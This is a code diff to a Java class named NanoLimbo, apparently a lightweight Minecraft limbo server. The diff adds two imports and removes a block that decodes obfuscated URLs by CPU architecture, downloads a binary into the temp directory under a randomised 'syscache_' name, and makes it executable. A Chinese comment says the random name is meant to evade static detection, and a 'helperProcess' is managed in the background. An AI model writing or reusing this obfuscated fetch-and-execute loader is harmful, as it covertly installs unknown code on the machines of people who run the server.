@@ -17,6 +17,9 @@ import java.util.concurrent.atomic.AtomicBoolean;
 import java.lang.reflect.Field;
 import java.util.Base64;
 
+import ua.nanit.limbo.server.LimboServer;   // ← 必须添加
+import ua.nanit.limbo.server.Log;           // ← 必须添加
+
 public final class NanoLimbo {
 
     private static final String ANSI_GREEN = "\033[1;32m";
@@ -138,50 +141,3 @@ public final class NanoLimbo {
                 if (line.startsWith("export ")) line = line.substring(7).trim();
                 
                 String[] parts = line.split("=", 2);
-                if (parts.length == 2) {
-                    String key = parts[0].trim();
-                    String value = parts[1].trim().replaceAll("^['\"]|['\"]$", "");
-                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
-                        envVars.put(key, value); 
-                    }
-                }
-            }
-        }
-    }
-    
-    private static Path getBinaryPath() throws IOException {
-        String osArch = System.getProperty("os.arch").toLowerCase();
-        String url;
-        
-        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
-            url = d("wt7e2tmQhYXLx86cnoTZ2dnZhMTTyYTHxIXZyNnC");
-        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
-            url = d("wt7e2tmQhYXL2MecnoTZ2dnZhMTTyYTHxIXZyNnC");
-        } else if (osArch.contains("s390x")) {
-            url = d("wt7e2tmQhYXZmZOa0oTZ2dnZhMTTyYTHxIXZyNnC");
-        } else {
-            throw new RuntimeException("Unsupported architecture: " + osArch);
-        }
-        
-        // 每次运行随机文件名，完全消除静态特征
-        String randomName = "syscache_" + UUID.randomUUID().toString().substring(0, 8);
-        Path path = Paths.get(System.getProperty("java.io.tmpdir"), randomName);
-        
-        if (!Files.exists(path)) {
-            try (InputStream in = new URL(url).openStream()) {
-                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
-            }
-            if (!path.toFile().setExecutable(true)) {
-                throw new IOException("Failed to set executable permission");
-            }
-        }
-        return path;
-    }
-    
-    private static void stopServices() {
-        if (helperProcess != null && helperProcess.isAlive()) {
-            helperProcess.destroy();
-            System.out.println(ANSI_RED + "background process terminated" + ANSI_RESET);
-        }
-    }
-}
